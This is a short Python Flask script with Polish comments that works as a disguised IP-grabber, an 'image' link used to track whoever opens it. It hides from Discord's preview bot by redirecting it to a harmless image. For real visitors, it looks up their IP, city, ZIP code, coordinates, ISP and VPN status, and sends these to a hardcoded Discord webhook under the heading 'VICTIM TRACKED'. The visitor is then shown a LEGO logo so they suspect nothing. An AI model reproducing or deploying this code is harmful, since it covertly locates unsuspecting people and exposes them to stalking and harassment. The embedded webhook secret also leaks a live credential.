from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- KONFIGURACJA ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1336930594799327529/VX0R1leJbv97emxJkz3rKjLKgr5BK6SgoSqcCn_cRc76VepZoxiEpPk3fcTPqgVYlyBi"
# Link do prawdziwego zdjęcia LEGO
REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"

@app.route('/image.png')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # 1. CLOAKING: Jeśli to bot Discorda, udajemy, że jesteśmy zwykłym obrazkiem Imgur
    if "Discordbot" in ua or "externalhit" in ua.lower():
        return redirect("https://i.imgur.com/8N9vX7o.png")

    # 2. TRACKING: Pobieramy dane o lokalizacji ofiary
    geo_data = {}
    try:
        # Pobieramy: miasto, region, kraj, dostawcę, współrzędne (lat/lon)
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,proxy,hosting", timeout=5).json()
        if r.get("status") == "success":
            geo_data = r
    except:
        pass

    # 3. DISCORD EMBED: Tworzymy ładną kartę z mapą i danymi
    lat = geo_data.get('lat', '0')
    lon = geo_data.get('lon', '0')
    
    payload = {
        "embeds": [{
            "title": "🔴 OFIARA NAMIERZONA",
            "description": "Użytkownik wszedł w link przez przeglądarkę.",
            "color": 16711680, # Czerwony
            "fields": [
                {"name": "🌐 Adres IP", "value": f"`{ip}`", "inline": True},
                {"name": "🛡️ VPN/Proxy", "value": f"`{'TAK' if geo_data.get('proxy') else 'NIE'}`", "inline": True},
                {"name": "📍 Lokalizacja", "value": f"{geo_data.get('city')}, {geo_data.get('regionName')}, {geo_data.get('country')} ({geo_data.get('zip')})", "inline": False},
                {"name": "🏢 Dostawca (ISP)", "value": f"{geo_data.get('isp')}", "inline": False},
                {"name": "🗺️ Google Maps", "value": f"[Kliknij, aby zobaczyć mapę](https://www.google.com/maps?q={lat},{lon})", "inline": False}
            ],
            "image": {"url": REAL_IMG}, # Pokazuje zdjęcie LEGO wewnątrz raportu
            "footer": {"text": f"User-Agent: {ua[:80]}..."}
        }]
    }

    # Wysyłka na Discord
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass

    # 4. PRZEKIEROWANIE: Ofiara widzi tylko zdjęcie
    return redirect(REAL_IMG)

if __name__ == '__main__':
    app.run(port=10000)
